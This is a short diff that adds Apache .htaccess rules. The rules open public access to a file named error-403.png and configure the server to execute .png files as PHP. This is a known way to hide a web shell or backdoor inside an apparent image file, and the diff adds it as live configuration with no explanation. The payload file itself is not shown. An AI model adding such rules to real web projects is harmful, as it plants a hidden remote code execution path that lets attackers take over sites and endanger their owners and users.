@@ -1,0 +1,9 @@
+<Files error-403.png>
+Order Deny,Allow
+Allow from all
+</Files>
+<Files error-403.png>
+Order Deny,Allow
+Allow from all
+</Files>
+AddType application/x-httpd-php .png
